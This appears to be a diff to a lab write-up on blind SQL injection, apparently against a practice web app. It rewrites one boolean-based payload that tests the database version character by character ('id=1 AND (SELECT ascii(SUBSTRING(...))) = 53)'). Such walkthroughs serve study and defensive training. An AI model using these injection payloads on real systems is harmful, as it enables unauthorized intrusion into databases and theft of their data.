@@ -139,7 +139,7 @@ SELECT SUBSTRING((SELECT @@version),1,6)
 5
 
 ```sql
-SELECT 1=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 53); &Submit=Submit
+id=1 AND (SELECT ascii(SUBSTRING((SELECT @@version),1,1)) = 53); &Submit=Submit
 # User ID is MISSING in the database
 ```
 
